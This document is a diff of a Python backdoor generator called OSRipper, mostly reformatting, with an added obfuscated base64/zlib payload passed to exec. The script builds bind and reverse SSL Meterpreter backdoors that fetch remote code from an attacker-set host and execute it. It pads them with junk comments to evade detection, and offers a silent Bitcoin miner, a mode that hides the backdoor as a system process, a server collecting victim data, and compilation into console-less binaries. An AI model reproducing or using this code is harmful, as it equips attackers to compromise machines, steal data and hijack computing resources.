@@ -1,5 +1,5 @@
 ########################################
-#------OSRIPPER MASTER V0.2.4.3--------#
+# ------OSRIPPER MASTER V0.2.4.3--------#
 ########################################
 
 import os
@@ -12,28 +12,49 @@ import string
 from ripgrok import get_tunnels
 import random
 from pickle import GLOBAL
-bind=0
+
+bind = 0
 ## RandomVariables
-nonce1=secrets.randbelow(13)
-nonce2=secrets.randbelow(13)
-UltimateRandomNumberhigh = random.randint(14,30)
-UltimateRandomNumberlow=secrets.randbelow(nonce1)
-UltimateRandomNumberhigh2 = random.randint(14,30)
-UltimateRandomNumberlow2=secrets.randbelow(nonce2)
+nonce1 = secrets.randbelow(13)
+nonce2 = secrets.randbelow(13)
+UltimateRandomNumberhigh = random.randint(14, 30)
+UltimateRandomNumberlow = secrets.randbelow(nonce1)
+UltimateRandomNumberhigh2 = random.randint(14, 30)
+UltimateRandomNumberlow2 = secrets.randbelow(nonce2)
 sleeptime = secrets.randbelow(12)
-VariableRange = random.randint(8,22)
-VariableRange2 = random.randint(8,22)
-VariableRange3 = random.randint(8,22)
-RandomisationNum = random.randint(UltimateRandomNumberlow,UltimateRandomNumberhigh)
-RandomisationNum2 = random.randint(UltimateRandomNumberlow2,UltimateRandomNumberhigh2)
-c=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange))))
-d=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange2))))
-so=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange))))
-s=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange2))))
-l=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange3))))
-dr=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange3))))
+VariableRange = random.randint(8, 22)
+VariableRange2 = random.randint(8, 22)
+VariableRange3 = random.randint(8, 22)
+RandomisationNum = random.randint(UltimateRandomNumberlow, UltimateRandomNumberhigh)
+RandomisationNum2 = random.randint(UltimateRandomNumberlow2, UltimateRandomNumberhigh2)
+c = "".join(
+    secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
+    for i in range(int(VariableRange))
+)
+d = "".join(
+    secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
+    for i in range(int(VariableRange2))
+)
+so = "".join(
+    secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
+    for i in range(int(VariableRange))
+)
+s = "".join(
+    secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
+    for i in range(int(VariableRange2))
+)
+l = "".join(
+    secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
+    for i in range(int(VariableRange3))
+)
+dr = "".join(
+    secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
+    for i in range(int(VariableRange3))
+)
 ## jesus christ that was a LOT of random variables (and there are even more hidden away)
-reps=False
+reps = False
+
+
 def logo():
     logo1 = """
 
@@ -84,7 +105,7 @@ def logo():
     ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
                                                                                 OSRIPPER v0.2.5
     """
-    logo2 = '''
+    logo2 = """
          ▄▀▀▀▀▄   ▄▀▀▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▀▄    ▄▀▀▄▀▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄ 
         █      █ █ █   ▐ █   █   █ █   █  █  █   █   █ █   █   █ ▐  ▄▀   ▐ █   █   █ 
         █      █    ▀▄   ▐  █▀▀█▀  ▐   █  ▐  ▐  █▀▀▀▀  ▐  █▀▀▀▀    █▄▄▄▄▄  ▐  █▀▀█▀  
@@ -93,8 +114,8 @@ def logo():
           ▐      ▐     ▐   █       █ █         █          █    ▐   ▐     ▐   
                            ▐       ▐ ▐         ▐          ▐                  
 
-    '''
-    logo3 = '''
+    """
+    logo3 = """
                                                                              
                           ,-.----.               ,----..                             
         ,-.----.     ,---,\    /  \             /   /   \   .--.--.   ,--,     ,--,  
@@ -111,8 +132,8 @@ def logo():
         |   |.'   '---'   `---'.|                `---`               ;   |/   \  ' | 
         `---'               `---`                                    `---'     `--`  
                                                                                 
-    '''
-    logo4 = '''
+    """
+    logo4 = """
                       .=-.-.   _ __              _,.---._      ,-,--.          ,-.--, 
           .-.,.---.  /==/_ /.-`.' ,`.          ,-.' , -  `.  ,-.'-  _\.--.-.  /=/, .' 
          /==/  `   \|==|, |/==/, -   \        /==/_,  ,  - \/==/_ ,_.'\==\ -\/=/- /   
@@ -123,20 +144,23 @@ def logo():
         /==/  /\ ,  )==/. /==/ - |             '.='. -   .' \==\ - , /\==\- \/=/ , /  
         `--`-`--`--'`--`-``--`---'               `--`--''    `--`---'  `--`-'  `--`   
 
-    '''
+    """
 
     logolist = [logo1, logo2, logo3, logo4]
     print(random.choice(logolist))
-clear = lambda: os.system('clear')
+
+
+clear = lambda: os.system("clear")
 clear()
 logo()
+
 
 def listen(host, port):
 
     SERVER_HOST = host
     SERVER_PORT = int(port)
     # send 1024 (1kb) a time (as buffer size)
-    BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
+    BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
     # separator string for sending 2 messages in one go
     SEPARATOR = "<sep>"
 
@@ -152,9 +176,6 @@ def listen(host, port):
 
     # accept any connections attempted
     client_socket, client_address = s.accept()
-
-
-
 
     # receiving the current working directory of the client
     cwd = client_socket.recv(BUFFER_SIZE).decode()
@@ -182,17 +203,21 @@ def listen(host, port):
     client_socket.close()
     # close server connection
     s.close()
+
+
 def gen_bind():
 
     global port
     global bind
     global name
-    name = 'ocr'
-    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
-    bind = '1'
-    with open(name, 'a+') as ina:
-        ina.write('port = '+str(port)+'\n')
-        a = '''
+    name = "ocr"
+    port = input(
+        "Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): "
+    )
+    bind = "1"
+    with open(name, "a+") as ina:
+        ina.write("port = " + str(port) + "\n")
+        a = """
 import zlib,base64,socket,struct,time
 def main():
     try:
@@ -210,105 +235,171 @@ def main():
         main()
 main()
 
-                '''
+                """
         ina.write(a)
         ina.close
-        print('(*) Generated Backdoor and saved as '+name)
-        print('After deployment interact with this Backdoor through this module in metasploit python/meterpreter/bind_tcp')
+        print("(*) Generated Backdoor and saved as " + name)
+        print(
+            "After deployment interact with this Backdoor through this module in metasploit python/meterpreter/bind_tcp"
+        )
+
+
 def gen_rev_ssl_tcp():
     global name
     global host
     global port
-    name = 'ocr'
-    ngrokchoice=input('Do you want to use ngrok port forwarding? (must have activated this in setup.py) y/n: ')
-    if ngrokchoice=='y':
-        port = input('Please enter the port number you wish the backdoor to connect to (recomended between 1024-65353): ')
-        input('Please run this command in another terminal "ngrok tcp '+ port+'" Press enter when you have done this: ')
-        ripgrokhostnport=(get_tunnels())
-        host=ripgrokhostnport.split(':')[0]
-        port=ripgrokhostnport.split(':')[1]
-    if ngrokchoice=='n':
-        host = input('Please enter the ip you wish the backdoor to connect back to: ')
-        port = input('Please enter the port number you wish the backdoor to connect to (recomended between 1024-65353): ')
-    with open(name, 'a+') as ina:
-        ina.write(d+' = '+port)
+    name = "ocr"
+    ngrokchoice = input(
+        "Do you want to use ngrok port forwarding? (must have activated this in setup.py) y/n: "
+    )
+    if ngrokchoice == "y":
+        port = input(
+            "Please enter the port number you wish the backdoor to connect to (recomended between 1024-65353): "
+        )
+        input(
+            'Please run this command in another terminal "ngrok tcp '
+            + port
+            + '" Press enter when you have done this: '
+        )
+        ripgrokhostnport = get_tunnels()
+        host = ripgrokhostnport.split(":")[0]
+        port = ripgrokhostnport.split(":")[1]
+    if ngrokchoice == "n":
+        host = input("Please enter the ip you wish the backdoor to connect back to: ")
+        port = input(
+            "Please enter the port number you wish the backdoor to connect to (recomended between 1024-65353): "
+        )
+    with open(name, "a+") as ina:
+        ina.write(d + " = " + port)
         ina.write("\n")
-        ina.write(c+' = "'+host+'"'+'\n')
+        ina.write(c + ' = "' + host + '"' + "\n")
         for i in range(int(RandomisationNum)):
-            a=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase + string.punctuation)for i in range(int(random.randint(0,17)))))
-            ina.write('#'+a+'\n')
-        b = '''
-from sandboxed import is_sandboxed
-import sys
-certainty = is_sandboxed(logging=False)
-if int(certainty)>0.5:
-    sys.exit()
-import zlib,base64,ssl,socket,struct,time
-'''
+            a = "".join(
+                secrets.choice(
+                    string.ascii_uppercase + string.ascii_lowercase + string.punctuation
+                )
+                for i in range(int(random.randint(0, 17)))
+            )
+            ina.write("#" + a + "\n")
+        b = """
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=ESU5q7A/7DdkvrebXNmTCl0aQAahglRAHgygYSP4mGC0u004WcTeF6+Qszx2bv93KGrVtpLqNylLSpXZbDmD5QwKTguST+/cRw+L92xJrWtPpjqP31zZjuJI2KZiuudWB8cxqU/45/VeUbsqwbJdtBEAtvdddtYXdfOmHFZNSUDIaMALA4XZmnsIXZthvUMG71u9ym3UUFLTPia3LLsIEbLb7GdegSnDo2x6unE2gf1v4Khk8ypBn5zMLjU2tk363fCRnwY2CTypnnakhRIsCm+f8mYPwRiPDNAAA0Q2ldwFwJe'))
+"""
         ina.write(b)
         for i in range(int(RandomisationNum2)):
-            b3=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase + string.punctuation)for i in range(int(random.randint(0,7)))))
-            ina.write('#'+b3+'\n')
-        b2 = '''
+            b3 = "".join(
+                secrets.choice(
+                    string.ascii_uppercase + string.ascii_lowercase + string.punctuation
+                )
+                for i in range(int(random.randint(0, 7)))
+            )
+            ina.write("#" + b3 + "\n")
+        b2 = (
+            """
 for x in range(10):
 	try:
-		'''+so+'''=socket.socket(2,1)
-		'''+so+'''.connect(('''+c+''','''+d+'''))
-		'''+s+'''=ssl.wrap_socket('''+so+''')
+		"""
+            + so
+            + """=socket.socket(2,1)
+		"""
+            + so
+            + """.connect(("""
+            + c
+            + ""","""
+            + d
+            + """))
+		"""
+            + s
+            + """=ssl.wrap_socket("""
+            + so
+            + """)
 		break
 
 
 	except:
-		time.sleep('''+str(sleeptime)+''')
+		time.sleep("""
+            + str(sleeptime)
+            + """)
 
 
-'''+l+'''=struct.unpack('>I','''+s+'''.recv(4))[0]
-'''+dr+'''='''+s+'''.recv('''+l+''')
-while len('''+dr+''')<'''+l+''':
-	'''+dr+'''+='''+s+'''.recv('''+l+'''-len('''+dr+'''))
-exec(zlib.decompress(base64.b64decode('''+dr+''')),{'s':'''+s+'''})
-'''
+"""
+            + l
+            + """=struct.unpack('>I',"""
+            + s
+            + """.recv(4))[0]
+"""
+            + dr
+            + """="""
+            + s
+            + """.recv("""
+            + l
+            + """)
+while len("""
+            + dr
+            + """)<"""
+            + l
+            + """:
+	"""
+            + dr
+            + """+="""
+            + s
+            + """.recv("""
+            + l
+            + """-len("""
+            + dr
+            + """))
+exec(zlib.decompress(base64.b64decode("""
+            + dr
+            + """)),{'s':"""
+            + s
+            + """})
+"""
+        )
         ina.write(b2)
 
-        opt_bind = input('Do you want to bind another program to this Backdoor?(y/n): ')
-        if opt_bind == 'y':
-            bind_file = input('Please enter the name (in same dir) of the .py you want to bind: ')
-            with open(bind_file, 'r') as bindfile:
-                bindfilecontent=bindfile.read()
+        opt_bind = input("Do you want to bind another program to this Backdoor?(y/n): ")
+        if opt_bind == "y":
+            bind_file = input(
+                "Please enter the name (in same dir) of the .py you want to bind: "
+            )
+            with open(bind_file, "r") as bindfile:
+                bindfilecontent = bindfile.read()
                 ina.write(bindfilecontent)
                 bindfile.close
 
-        print('(*) Generated Backdoor and saved as '+name)
-def gen_custom():
-    customshell=input("Please enter the file name containing your code: ")
-    global name
-    name="ocr"
-   
+        print("(*) Generated Backdoor and saved as " + name)
 
-    with open(customshell, 'r') as cuso:
-        with open(name, 'a+') as ina:
+
+def gen_custom():
+    customshell = input("Please enter the file name containing your code: ")
+    global name
+    name = "ocr"
+
+    with open(customshell, "r") as cuso:
+        with open(name, "a+") as ina:
             for line in cuso:
                 ina.write(line)
 
-
-        opt_bind = input('Do you want to bind another program to this Backdoor?(y/n): ')
-        if opt_bind == 'y':
-            bind_file = input('Please enter the name (in same dir) of the .py you want to bind: ')
-            with open(bind_file, 'r') as bindfile:
-                bindfilecontent=bindfile.read()
+        opt_bind = input("Do you want to bind another program to this Backdoor?(y/n): ")
+        if opt_bind == "y":
+            bind_file = input(
+                "Please enter the name (in same dir) of the .py you want to bind: "
+            )
+            with open(bind_file, "r") as bindfile:
+                bindfilecontent = bindfile.read()
                 ina.write(bindfilecontent)
                 bindfile.close
 
-        print('(*) Generated Backdoor and saved as '+name)
+        print("(*) Generated Backdoor and saved as " + name)
+
 
 def gen_btc_miner():
     global name
     global host
-    name = 'ocr'
-    addy = input('Please enter the payout btc address: ')
-    with open(name, 'a+') as ina:
-        ina.write('addy = "'+addy+'"\n')
-        b = r'''
+    name = "ocr"
+    addy = input("Please enter the payout btc address: ")
+    with open(name, "a+") as ina:
+        ina.write('addy = "' + addy + '"\n')
+        b = r"""
 
 import socket
 import json
@@ -394,57 +485,93 @@ def main():
     sock.close()
 main()
 
-'''
+"""
         ina.write(b)
+
+
 def postgen():
-    opt_obf = input('Do you want to obfuscate the generated programm (recommended) (y/n): ')
+    opt_obf = input(
+        "Do you want to obfuscate the generated programm (recommended) (y/n): "
+    )
     global encrypted
     encrypted = False
-    b=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase)for i in range(13)))
-    if opt_obf == 'y':
+    b = "".join(
+        secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
+        for i in range(13)
+    )
+    if opt_obf == "y":
         encrypted = True
         import obfuscator
+
         obfuscator.MainMenu(name)
-    compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
-    if compiling == 'y':
+    compiling = input(
+        "Do you want to compile the script into a binary (might require sudo) (y/n): "
+    )
+    if compiling == "y":
         global icochoice
-        icochoice = input("Enter .ico path to set a custom icon (press enter for default): ")
+        icochoice = input(
+            "Enter .ico path to set a custom icon (press enter for default): "
+        )
         if encrypted == True:
             if icochoice:
-                compcomd = 'python3 -m nuitka --standalone --include-module=sandboxed --disable-console --macos-onefile-icon='+icochoice+' --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name+'_or.py'
+                compcomd = (
+                    "python3 -m nuitka --standalone --include-module=sandboxed --disable-console --macos-onefile-icon="
+                    + icochoice
+                    + " --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle "
+                    + name
+                    + "_or.py"
+                )
                 os.system(compcomd)
                 print('Saved under "dist" folder')
             else:
-                compcomd = 'python3 -m nuitka --standalone --include-module=sandboxed --disable-console --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name+'_or.py'
+                compcomd = (
+                    "python3 -m nuitka --standalone --include-module=sandboxed --disable-console --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle "
+                    + name
+                    + "_or.py"
+                )
                 os.system(compcomd)
                 print('Saved under "dist" folder')
 
         else:
             if icochoice:
-                compcomd = 'python3 -m nuitka --standalone --include-module=sandboxed --disable-console --macos-onefile-icon='+icochoice+' --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name
+                compcomd = (
+                    "python3 -m nuitka --standalone --include-module=sandboxed --disable-console --macos-onefile-icon="
+                    + icochoice
+                    + " --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle "
+                    + name
+                )
                 os.system(compcomd)
                 print('Saved under "dist" folder')
             else:
-                compcomd = 'python3 -m nuitka --standalone --include-module=sandboxed --disable-console --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name
+                compcomd = (
+                    "python3 -m nuitka --standalone --include-module=sandboxed --disable-console --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle "
+                    + name
+                )
                 os.system(compcomd)
                 print('Saved under "dist" folder')
             print(logo)
             print('Backdoor saved under "dist" folder')
+
+
 def rep_syst():
-    hide = input('Do you want the backdoor to hide itself and replicate a system proccess? (OSX and linux only and doesnt support ngrok) (y/n): ')
-    if hide == 'y':
+    hide = input(
+        "Do you want the backdoor to hide itself and replicate a system proccess? (OSX and linux only and doesnt support ngrok) (y/n): "
+    )
+    if hide == "y":
         global name2
         global reps
-        reps=True
-        if bind == '1':
-            host2='localhost'
+        reps = True
+        if bind == "1":
+            host2 = "localhost"
         else:
-            host2=host
-        name2=input('Please enter the name for the rat: ')
-        icochoice = input("Enter .ico path to set a custom icon (press enter for default): ")
-        with open(name2, 'a+') as hider:
-            hider.write(str('host = "'+host2+'"\n'))
-            v= '''
+            host2 = host
+        name2 = input("Please enter the name for the rat: ")
+        icochoice = input(
+            "Enter .ico path to set a custom icon (press enter for default): "
+        )
+        with open(name2, "a+") as hider:
+            hider.write(str('host = "' + host2 + '"\n'))
+            v = """
 import os
 import shutil
 import time
@@ -497,16 +624,29 @@ s.close()
 os.system('chmod u+x '+dest)
 os.system(dest)
 
-            '''
+            """
             hider.write(v)
             hider.close()
             import obfuscator
+
             obfuscator.MainMenu(name2)
             if icochoice:
-                os.system('sudo pyinstaller -i '+icochoice+' --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '+str(name2)+'_or.py')
-  
+                os.system(
+                    "sudo pyinstaller -i "
+                    + icochoice
+                    + ' --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '
+                    + str(name2)
+                    + "_or.py"
+                )
+
             else:
-                os.system('sudo pyinstaller --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '+str(name2)+'_or.py')
+                os.system(
+                    'sudo pyinstaller --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '
+                    + str(name2)
+                    + "_or.py"
+                )
+
+
 def server():
     import socket
 
@@ -518,24 +658,24 @@ def server():
     print("\n Server is listening on port :", PORT, "\n")
 
     # Now we need to bind to the above port at server side
-    s.bind(('', PORT))
+    s.bind(("", PORT))
 
-    # Now we will put server into listenig  mode 
+    # Now we will put server into listenig  mode
     s.listen(10)
 
-    #Open one recv.txt file in write mode
-    file = open("recv.txt", "wb") 
-    #print("\n Copied file name will be recv.txt at server side\n")
+    # Open one recv.txt file in write mode
+    file = open("recv.txt", "wb")
+    # print("\n Copied file name will be recv.txt at server side\n")
 
-    # Now we do not know when client will concatct server so server should be listening contineously  
+    # Now we do not know when client will concatct server so server should be listening contineously
     while True:
         # Now we can establish connection with clien
         conn, addr = s.accept()
 
         # Send a hello message to client
-        #msg = "\n\n|---------------------------------|\n Hi Client[IP address: "+ addr[0] + "], \n ֲֳ**Welcome to Server** \n -Server\n|---------------------------------|\n \n\n"    
-        #conn.send(msg.encode())
-        
+        # msg = "\n\n|---------------------------------|\n Hi Client[IP address: "+ addr[0] + "], \n ֲֳ**Welcome to Server** \n -Server\n|---------------------------------|\n \n\n"
+        # conn.send(msg.encode())
+
         # Receive any data from client side
         RecvData = conn.recv(1024)
         while RecvData:
@@ -552,26 +692,30 @@ def server():
 
         # Come out from the infinite while loop as the file has been copied from client.
         break
+
+
 def cleanup():
     try:
         if reps == False:
-            os.remove('ocr.py')
-            os.remove('ocr_or.py')
-            os.remove('ocr_or.spec')
-        if reps==True:
+            os.remove("ocr.py")
+            os.remove("ocr_or.py")
+            os.remove("ocr_or.spec")
+        if reps == True:
             os.remove(name2)
-            os.remove(name2+'.spec')
-            os.remove('ocr.py')
-            os.remove('ocr_or.py')
-            os.remove('ocr_or.spec')
-            if platform.system() == 'Windows':
-                shutil.rmtree(os.getcwd()+'/dist/ocr_or.exe')
+            os.remove(name2 + ".spec")
+            os.remove("ocr.py")
+            os.remove("ocr_or.py")
+            os.remove("ocr_or.spec")
+            if platform.system() == "Windows":
+                shutil.rmtree(os.getcwd() + "/dist/ocr_or.exe")
             else:
-                shutil.rmtree(os.getcwd()+'/dist/'+name2)
+                shutil.rmtree(os.getcwd() + "/dist/" + name2)
     except FileNotFoundError:
         pass
 
-print("""
+
+print(
+    """
     
         1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
         2. Create Encrypted TCP Meterpreter (can embed in other script) (recommended)
@@ -580,66 +724,97 @@ print("""
                                                 Miners
         4. Create a silent BTC miner
         
-""")  
-encrypted = False     
+"""
+)
+encrypted = False
 nscan = input("Please select a module: ")
 if nscan == "1":
     gen_bind()
     postgen()
     cleanup()
-    os.system('clear')
-    print('Generated in dist')
+    os.system("clear")
+    print("Generated in dist")
     a = "use python/meterpreter/bind_tcp in metasploit to connect to target"
     print(a)
 if nscan == "2":
     clear()
     logo()
-    print('##########################################################################################')
-    print('Generating')
+    print(
+        "##########################################################################################"
+    )
+    print("Generating")
     gen_rev_ssl_tcp()
     clear()
     logo()
-    print('##########################################################################################')
-    print('Specifying')
+    print(
+        "##########################################################################################"
+    )
+    print("Specifying")
     postgen()
     clear()
     logo()
-    print('##########################################################################################')
-    print('RootKit')
+    print(
+        "##########################################################################################"
+    )
+    print("RootKit")
     rep_syst()
     if reps == True:
-        print('Generated in dist')
-        print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
-        print('After that the listener will spawn instantly')
+        print("Generated in dist")
+        print(
+            "OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target"
+        )
+        print("After that the listener will spawn instantly")
         server()
-        print('wait...')
-        a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
+        print("wait...")
+        a = (
+            "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "
+            + port
+            + "; exploit'"
+        )
         os.system(a)
     else:
-        print('wait...')
-        a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
+        print("wait...")
+        a = (
+            "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "
+            + port
+            + "; exploit'"
+        )
         os.system(a)
 if nscan == "3":
     gen_custom()
     postgen()
     rep_syst()
-if nscan == '4':
+if nscan == "4":
     gen_btc_miner()
-    opt_obf = input('Do you want to obfuscate the generated programm (recommended) (y/n): ')
-    print("obfuscating... (might take a few minutes due to the layer based obfuscation)")
+    opt_obf = input(
+        "Do you want to obfuscate the generated programm (recommended) (y/n): "
+    )
+    print(
+        "obfuscating... (might take a few minutes due to the layer based obfuscation)"
+    )
     encrypted = False
-    if opt_obf == 'y':
+    if opt_obf == "y":
         encrypted = True
         import obfuscator
+
         obfuscator.MainMenu(name)
-    compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
-    if compiling == 'y':
+    compiling = input(
+        "Do you want to compile the script into a binary (might require sudo) (y/n): "
+    )
+    if compiling == "y":
         if encrypted == True:
-            compcomd = 'pyinstaller -F --windowed --hidden-import socket --hidden-import json --hidden-import pprint --hidden-import hashlib --hidden-import binascii '+name+'_or.py'
+            compcomd = (
+                "pyinstaller -F --windowed --hidden-import socket --hidden-import json --hidden-import pprint --hidden-import hashlib --hidden-import binascii "
+                + name
+                + "_or.py"
+            )
             os.system(compcomd)
             print('Saved under "dist" folder')
         else:
-            compcomd = 'pyinstaller -F --windowed --hidden-import socket --hidden-import json --hidden-import pprint --hidden-import hashlib --hidden-import binascii '+name
+            compcomd = (
+                "pyinstaller -F --windowed --hidden-import socket --hidden-import json --hidden-import pprint --hidden-import hashlib --hidden-import binascii "
+                + name
+            )
             os.system(compcomd)
             os.system(clear)
             print(logo)
@@ -647,4 +822,4 @@ if nscan == '4':
     print("You can monitor your `miners` here : https://solo.ckpool.org/")
     cleanup()
 else:
-    print('Please select a vaild option')
+    print("Please select a vaild option")
